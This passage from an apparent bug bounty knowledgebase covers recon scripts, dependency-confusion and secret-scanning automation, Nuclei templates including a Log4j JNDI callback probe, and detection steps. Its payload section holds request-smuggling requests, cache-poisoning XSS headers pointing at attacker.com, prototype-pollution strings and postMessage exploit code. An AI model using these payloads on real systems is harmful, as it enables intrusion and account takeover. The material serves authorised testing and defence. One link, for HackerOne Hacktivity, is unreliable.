pip install package==1.0.0

# Check if application accepts any version
```

### Header Fuzzing for Cache Poisoning

```bash
# Fuzz unkeyed headers
# Using ffuf or Burp Intruder

ffuf -w headers.txt -u https://target.com/     -H "FUZZ: attacker.com"     -mr "attacker.com"

# Common unkeyed headers to test:
# X-Forwarded-Host
# X-Forwarded-For
# X-Real-IP
# X-Original-URL
# X-Rewrite-URL
# X-HTTP-Method-Override
# X-Forwarded-Scheme
# X-Forwarded-Server
# X-Forwarded-Proto
# X-Host
# Forwarded
# CF-Connecting-IP
# True-Client-IP
```

---

## Automation Workflows

### Dependency Confusion Automation

```bash
#!/bin/bash
# dependency_confusion_scanner.sh

TARGET=$1
OUTPUT_DIR="./results/$TARGET"
mkdir -p $OUTPUT_DIR

# Step 1: Find package files
echo "[*] Searching for dependency files..."
waybackurls $TARGET | grep -E "(package\.json|requirements\.txt|pom\.xml|Gemfile)" > $OUTPUT_DIR/dep_files.txt

# Step 2: Download and parse
cat $OUTPUT_DIR/dep_files.txt | while read url; do
    curl -s "$url" -o "$OUTPUT_DIR/$(basename $url).$(date +%s)"
done

# Step 3: Extract package names
cat $OUTPUT_DIR/package.json* | jq -r '.dependencies | keys[]' 2>/dev/null > $OUTPUT_DIR/npm_packages.txt
cat $OUTPUT_DIR/requirements.txt* | grep -oE "^[a-zA-Z0-9_-]+" > $OUTPUT_DIR/pip_packages.txt

# Step 4: Check public registry
echo "[*] Checking npm registry..."
cat $OUTPUT_DIR/npm_packages.txt | while read pkg; do
    if npm view "$pkg" &>/dev/null; then
        echo "[+] $pkg exists on npm"
    else
        echo "[!] $pkg NOT on npm - potential internal package"
        echo "$pkg" >> $OUTPUT_DIR/potential_internal_npm.txt
    fi
done

echo "[*] Checking PyPI..."
cat $OUTPUT_DIR/pip_packages.txt | while read pkg; do
    if pip index versions "$pkg" &>/dev/null; then
        echo "[+] $pkg exists on PyPI"
    else
        echo "[!] $pkg NOT on PyPI - potential internal package"
        echo "$pkg" >> $OUTPUT_DIR/potential_internal_pip.txt
    fi
done

echo "[*] Results saved to $OUTPUT_DIR"
```

### CVE Scanner Automation

```bash
#!/bin/bash
# cve_scanner.sh

TARGET=$1

# Step 1: Technology detection
echo "[*] Detecting technologies..."
whatweb -a 3 $TARGET > tech.txt
wappalyzer $TARGET > wappalyzer.json

# Step 2: Version extraction
echo "[*] Extracting versions..."
# Parse whatweb output for versions
# Parse wappalyzer JSON

# Step 3: CVE lookup
echo "[*] Looking up CVEs..."
# Use searchsploit or custom CVE DB
searchsploit --json | jq -r '.RESULTS_EXPLOIT[] | select(.Title | contains("nginx"))'

# Step 4: Nuclei CVE scan
echo "[*] Running Nuclei CVE templates..."
nuclei -u $TARGET -t cves/ -severity critical,high
```

### Secret Scanner Automation

```bash
#!/bin/bash
# secret_scanner.sh

TARGET=$1
OUTPUT_DIR="./secrets/$TARGET"
mkdir -p $OUTPUT_DIR

# Step 1: Clone repo (if applicable)
git clone --depth 1 https://github.com/$TARGET $OUTPUT_DIR/repo 2>/dev/null

# Step 2: Run TruffleHog
echo "[*] Running TruffleHog..."
trufflehog git file://$OUTPUT_DIR/repo --json > $OUTPUT_DIR/trufflehog.json

# Step 3: Run Gitleaks
echo "[*] Running Gitleaks..."
gitleaks detect --source $OUTPUT_DIR/repo --verbose --report-format json --report-path $OUTPUT_DIR/gitleaks.json

# Step 4: Manual patterns
echo "[*] Searching for common patterns..."
grep -r "AKIA[0-9A-Z]{16}" $OUTPUT_DIR/repo > $OUTPUT_DIR/aws_keys.txt
grep -r "ghp_[a-zA-Z0-9]{36}" $OUTPUT_DIR/repo > $OUTPUT_DIR/github_tokens.txt
grep -r "sk-[a-zA-Z0-9]{48}" $OUTPUT_DIR/repo > $OUTPUT_DIR/openai_keys.txt
grep -r "private_key" $OUTPUT_DIR/repo > $OUTPUT_DIR/private_keys.txt
```

---

## Recon Methodology

### Phase 1: Asset Discovery

```bash
# 1. Subdomain enumeration
subfinder -d target.com -o subs.txt
assetfinder --subs-only target.com >> subs.txt
findomain -t target.com >> subs.txt
amass enum -d target.com -o amass.txt

# 2. DNS resolution and filtering
cat subs.txt | anew all_subs.txt
cat all_subs.txt | dnsx -o resolved.txt

# 3. HTTP probing
cat resolved.txt | httprobe -p http:80 -p https:443 -o alive.txt

# 4. Screenshotting
cat alive.txt | aquatone -out ./aquatone/
```

### Phase 2: Technology Mapping

```bash
# 1. Wappalyzer scan
for url in $(cat alive.txt); do
    wappalyzer $url >> tech.json
done

# 2. Nuclei tech detection
nuclei -l alive.txt -t http/technologies/ -o tech_nuclei.txt

# 3. Manual header inspection
for url in $(cat alive.txt | head -20); do
    echo "=== $url ==="
    curl -I -s "$url" | grep -E "Server|X-Powered-By|X-AspNet"
done
```

### Phase 3: Dependency Analysis

```bash
# 1. Search for exposed dependency files
for url in $(cat alive.txt); do
    for file in package.json requirements.txt pom.xml Gemfile composer.json; do
        status=$(curl -s -o /dev/null -w "%{http_code}" "$url/$file")
        if [ "$status" == "200" ]; then
            echo "[+] $url/$file"
            curl -s "$url/$file" -o "deps/$(echo $url | sed 's/[^a-zA-Z0-9]/_/g')_$file"
        fi
    done
done

# 2. JavaScript analysis
# Download all JS files and analyze
katana -list alive.txt -o js_files.txt
```

### Phase 4: Vulnerability Correlation

```bash
# 1. Match technologies to CVEs
# Use custom script or nuclei

# 2. Check for exposed panels/admin interfaces
nuclei -l alive.txt -t http/exposures/ -o exposures.txt

# 3. Check for default credentials
nuclei -l alive.txt -t http/default-logins/ -o default_creds.txt
```

---

## Nuclei Templates

### Template Structure

```yaml
id: vulnerable-component-example

info:
  name: Vulnerable Component Detection
  author: researcher
  severity: high
  description: |
    Detects vulnerable version of Component X
  reference:
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-202X-XXXXX
  metadata:
    verified: true
    shodan-query: 'html:"Component X v1.2.3"'
  tags: cve,cve202X,component,x,rce

http:
  - method: GET
    path:
      - "{{BaseURL}}/path/to/endpoint"

    matchers:
      - type: regex
        part: body
        regex:
          - "Component X v(1\.2\.[0-3])"
          - "Component X/(1\.2\.[0-3])"

    extractors:
      - type: regex
        part: body
        group: 1
        regex:
          - "Component X v([0-9]+\.[0-9]+\.[0-9]+)"
```

### CVE Detection Template

```yaml
id: CVE-2021-44228-log4j

info:
  name: Log4j JNDI Injection
  author: pdteam
  severity: critical
  description: |
    Apache Log4j2 <=2.14.1 JNDI features used in configuration,
    log messages, and parameters do not protect against attacker
    controlled LDAP and other JNDI related endpoints.
  reference:
    - https://logging.apache.org/log4j/2.x/security.html
  tags: cve,cve2021,rce,jndi,log4j,oast

http:
  - raw:
      - |
        GET /?x=${jndi:ldap://{{interactsh-url}}/a} HTTP/1.1
        Host: {{Hostname}}

      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        x=${jndi:ldap://{{interactsh-url}}/a}

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
```

### Technology Detection Template

```yaml
id: tech-angular-version

info:
  name: Angular Version Detection
  author: researcher
  severity: info
  description: Detects AngularJS/Angular version from global object
  tags: tech,angular,javascript

http:
  - method: GET
    path:
      - "{{BaseURL}}"

    matchers:
      - type: regex
        part: body
        regex:
          - "angular\.version\s*=\s*\{[^}]*version:\s*['"]([^'"]+)"
          - "window\.angular\s*&&\s*window\.angular\.version"

    extractors:
      - type: regex
        part: body
        group: 1
        regex:
          - "angular\.version\s*=\s*\{[^}]*version:\s*['"]([^'"]+)"
```

### Exposed File Template

```yaml
id: exposed-package-json

info:
  name: Exposed package.json
  author: researcher
  severity: medium
  description: package.json file exposed revealing dependencies
  tags: exposure,config,nodejs

http:
  - method: GET
    path:
      - "{{BaseURL}}/package.json"
      - "{{BaseURL}}/package-lock.json"

    matchers:
      - type: word
        words:
          - '"dependencies"'
          - '"name"'
          - '"version"'
        condition: and

    extractors:
      - type: regex
        part: body
        regex:
          - '"name":\s*"([^"]+)"'
          - '"version":\s*"([^"]+)"'
```

---

## Tools and Scanners

### Secret Scanning

| Tool | Purpose | Command |
|------|---------|---------|
| **TruffleHog** | Deep secret scanning | `trufflehog git <repo>` |
| **Gitleaks** | Fast secret detection | `gitleaks detect --source .` |
| **GitLeaks** | Alternative to Gitleaks | `gitleaks detect -v` |
| **Gitrob** | Organization-level scanning | `gitrob <org>` |
| **shhgit** | Real-time GitHub scanning | `shhgit` |

### Dependency Scanning

| Tool | Purpose | Command |
|------|---------|---------|
| **Snyk CLI** | Vulnerability scanning | `snyk test` |
| **OWASP Dependency-Check** | CVE-based scanning | `dependency-check.sh -p .` |
| **Trivy** | Container/dependency scanning | `trivy fs .` |
| **Grype** | Vulnerability scanner | `grype dir:.` |
| **OSV-Scanner** | Google OSV integration | `osv-scanner -r .` |
| **OWASP SCVS** | Component verification | Reference standard |

### SCA (Software Composition Analysis)

| Tool | Purpose |
|------|---------|
| **Snyk** | Commercial SCA + SAST |
| **FOSSA** | Open source license/compliance |
| **WhiteSource** | Commercial SCA |
| **Sonatype Nexus** | Repository + SCA |
| **JFrog Xray** | Artifact scanning |

### Supply Chain Security

| Tool | Purpose |
|------|---------|
| **Sigstore/Cosign** | Artifact signing |
| **SLSA** | Supply chain levels |
| **in-toto** | Supply chain metadata |
| **Scorecard** | OSS security scoring |

### Reconnaissance

| Tool | Purpose | Command |
|------|---------|---------|
| **Nuclei** | Vulnerability scanning | `nuclei -u target.com` |
| **Subfinder** | Subdomain enumeration | `subfinder -d target.com` |
| **HTTPX** | Fast HTTP probing | `cat subs.txt | httpx` |
| **Katana** | Web crawler | `katana -u target.com` |
| **Naabu** | Port scanning | `naabu -host target.com` |
| **Interactsh** | OOB interaction | `interactsh-client` |
| **Notify** | Notification framework | `notify` |

### Request Smuggling

| Tool | Purpose |
|------|---------|
| **HTTP Request Smuggler** | Burp extension for desync detection |
| **Turbo Intruder** | Fast HTTP attacks |
| **Param Miner** | Unkeyed input discovery |
| **Smuggler** | Python-based smuggling tool |

### Client-Side Testing

| Tool | Purpose |
|------|---------|
| **pp-finder** | Prototype pollution detection |
| **postMessage-tracker** | postMessage monitoring |
| **DOM Invader** | Burp Suite DOM testing |
| **CursedChrome** | Chrome extension exploitation |
| **cariddi** | Crawler + secrets finder |

---

## Advanced Research

### HTTP Request Smuggling Evolution

```
2019: CL.TE / TE.CL (classic request smuggling)
2021: H2.CL / H2.TE (HTTP/2 downgrade smuggling)
2022: CL.0 / H2.0 (endpoints ignoring Content-Length)
2024: TE.0 (dechunking attacks)
2025: TE.TE (chunk extension attacks)
2025: 0.CL (Expect-based desync)
2025: Expect-based desync (vanilla + obfuscated)
```

### Parser Discrepancy Detection Strategy

```
Permutation → Header → Strategy → Classification
    ↓            ↓          ↓            ↓
Every        Content-   Single/     HIDDEN, VISIBLE,
obfuscation  Length     Duplicate   IGNORED, BLOCKED,
technique    Host       POST/GET    DISCREPANCY
             Max-Forwards
             Range
             Expect
```

### V-H vs H-V Discrepancies

- **V-H (Visible-Hidden)**: Masked header visible to front-end, hidden from back-end
  - Exploit: Hide Content-Length for CL.0 desync
  - Exploit: Hide Transfer-Encoding for TE.CL

- **H-V (Hidden-Visible)**: Masked header hidden from front-end, visible to back-end
  - Exploit: Hide malicious header from WAF, visible to back-end
  - Exploit: 0.CL desync (front-end doesn't see CL, back-end does)

### Early-Response Gadgets

```
Server          Gadget                  Effect
------          ------                  ------
nginx           Static file request     Responds without reading body
IIS             /con, /nul, /aux        Windows reserved names trigger early response
IIS             Server-level redirect   301/302 without body read
Apache          (No reliable gadget)    Closes connection on errors
```

---

## Bug Bounty Writeups

### Key Writeup Sources

- **HackerOne Hacktivity**: hackernoon.com/hacktivity
- **Bugcrowd Blog**: bugcrowd.com/blog
- **PortSwigger Research**: portswigger.net/research
- **Intigriti Blog**: blog.intigriti.com
- **YesWeHack Blog**: blog.yeswehack.com

### Common Bounty Patterns for Supply Chain

| Vulnerability | Severity | Typical Bounty |
|--------------|----------|---------------|
| Dependency Confusion → RCE | Critical | $5,000 - $30,000 |
| Exposed package.json with internal packages | Medium | $500 - $2,000 |
| Vulnerable dependency → XSS | High | $1,000 - $5,000 |
| Vulnerable dependency → RCE | Critical | $5,000 - $50,000 |
| Cache poisoning → JS hijacking | High | $2,000 - $10,000 |
| Request smuggling → account takeover | Critical | $5,000 - $25,000 |

---

## Payload Collections

### Request Smuggling Payloads

```http
# CL.TE
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

1
A
0

GET /admin HTTP/1.1
Host: target.com

# TE.CL
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

X

# CL.0
POST /static/file.css HTTP/1.1
Host: target.com
Content-Length: 41

GET /admin HTTP/1.1
Host: target.com
X: 

# H2.CL (HTTP/2 → HTTP/1.1 downgrade)
# Send via HTTP/2:
:method POST
:path /
:authority target.com
content-length 0

# Body contains smuggled request

# 0.CL (with Expect)
GET /con HTTP/1.1
Host: target.com
Content-Length: 
7

GET / HTTP/1.1
Host: target.com
```

### Cache Poisoning Payloads

```http
# Basic XSS via X-Forwarded-Host
GET /en?cb=1 HTTP/1.1
Host: target.com
X-Forwarded-Host: a."><script>alert(1)</script>

# Route poisoning via X-Forwarded-Server
GET / HTTP/1.1
Host: target.com
X-Forwarded-Server: attacker.com

# Open Graph hijacking
GET /en HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com

# DOM poisoning via data-site-root
GET /dataset HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
```

### Prototype Pollution Payloads

```
# jQuery $.extend
?__proto__[polluted]=true

# lodash merge
?constructor[prototype][polluted]=true

# Express qs parser
?__proto__[admin]=true

# JSON.parse with __proto__
{"__proto__": {"polluted": true}}
```

### postMessage Exploitation Payloads

```javascript
// Basic exploitation
window.open('https://victim.com').postMessage('{"action":"eval","code":"alert(1)"}', '*');

// null origin bypass
const frame = document.createElement('iframe');
frame.sandbox = 'allow-scripts allow-popups';
frame.srcdoc = `<script>
const w = window.open('https://victim.com');
setTimeout(() => w.postMessage('exploit', '*'), 1000);
<\/script>`;
document.body.appendChild(frame);

// event.source nullification
function postMessageNoSource(w, data) {
    window.ref = w; window.data = data;
    const iframe = document.createElement('iframe');
    iframe.srcdoc = '';
    document.body.appendChild(iframe);
    iframe.onload = () => {
        iframe.contentWindow.eval('top.ref.postMessage(top.data, "*")');
        iframe.remove();
    };
}
```

---

## Detection Techniques

### Detecting Dependency Confusion

```bash
# 1. Audit registry configuration
cat .npmrc
cat .yarnrc
cat pip.conf

# 2. Check for scope mapping
npm config get @company:registry

# 3. Verify package provenance
npm audit
npm ls --depth=10

# 4. Use lock files
# package-lock.json, yarn.lock, Pipfile.lock
# Verify checksums match expected values
```

### Detecting Request Smuggling

```bash
# Using HTTP Request Smuggler (Burp extension)
# 1. Right-click request → Extensions → HTTP Request Smuggler → Launch
# 2. Select detection technique (CL.TE, TE.CL, CL.0)
# 3. Review results for desync evidence

# Manual detection
# Send two requests over single connection
# Check if body of first affects response to second
```

### Detecting Cache Poisoning

```bash
# 1. Identify cache behavior
curl -I https://target.com/page
# Look for: CF-Cache-Status, X-Cache, Age, max-age

# 2. Test for unkeyed inputs
curl -H "X-Forwarded-Host: attacker.com" https://target.com/page?cb=1
# Check if header value reflected in response

# 3. Verify cache storage
curl https://target.com/page?cb=1
# Send without malicious header
# If still poisoned, cache was successful
```

### Detecting Prototype Pollution

```javascript
// Test for prototype pollution
// Before: Object.prototype.polluted should be undefined
// After sending payload, check if polluted

// Browser console test:
Object.prototype.polluted === undefined
// Send: ?__proto__[polluted]=true
// Check again: Object.prototype.polluted === 'true'
```

---

## References

### Official Resources

- OWASP Top 10 2021 - A06: Vulnerable and Outdated Components: https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/
- OWASP Software Component Verification Standard: https://owasp.org/www-project-software-component-verification-standard/
- PortSwigger Web Security Academy - Dependency Confusion: https://portswigger.net/web-security/dependency-confusion
- PortSwigger Research: https://portswigger.net/research
- MDN Content-Security-Policy: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy
- npm package.json docs: https://docs.npmjs.com/cli/v10/configuring-npm/package-json
- Python Packaging Specifications: https://packaging.python.org/en/latest/specifications/

### Research Papers

- "Dependency Confusion: How I Hacked Into Apple, Microsoft and Dozens of Other Companies" - Alex Birsan
- "HTTP Request Smuggling" - James Kettle (PortSwigger)
- "Browser-Powered Desync Attacks" - James Kettle (2022)
- "Practical Web Cache Poisoning" - James Kettle (2018)
- "HTTP/1.1 Must Die: The Desync Endgame" - James Kettle (2025)
- "Bypassing CSP with Dangling Iframes" - PortSwigger (2022)
- "Cracking the Lens: Targeting HTTP's Hidden Attack Surface" - James Kettle

### Tools & Repositories

- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
- TruffleHog: https://github.com/trufflesecurity/trufflehog
- Gitleaks: https://github.com/gitleaks/gitleaks
- OWASP dep-scan: https://github.com/owasp-dep-scan/dep-scan
- Trivy: https://github.com/aquasecurity/trivy
- Grype: https://github.com/anchore/grype
- Snyk CLI: https://github.com/snyk/cli
- OpenSSF Scorecard: https://github.com/ossf/scorecard
- OSV-Scanner: https://github.com/google/osv-scanner
- Nuclei: https://github.com/projectdiscovery/nuclei
- Nuclei Templates: https://github.com/projectdiscovery/nuclei-templates
- HTTP Request Smuggler: https://github.com/PortSwigger/http-request-smuggler
- Param Miner: https://github.com/PortSwigger/param-miner
- postMessage-tracker: https://github.com/fransr/postMessage-tracker
- pp-finder: https://github.com/yeswehack/pp-finder
- SecLists: https://github.com/danielmiessler/SecLists
- HackTricks: https://book.hacktricks.wiki

### Community Resources

- 0xspade Bug Bounty Supply Chain: https://github.com/0xspade/bugbounty/tree/master/supply-chain
- CISA KEV Catalog: https://www.cisa.gov/known-exploited-vulnerabilities-catalog
- NVD: https://nvd.nist.gov
- OSV: https://osv.dev
- Snyk VulnDB: https://security.snyk.io

---

> **Disclaimer:** This knowledgebase is for authorized security research and bug bounty hunting only. Always operate within program scope and follow responsible disclosure practices.
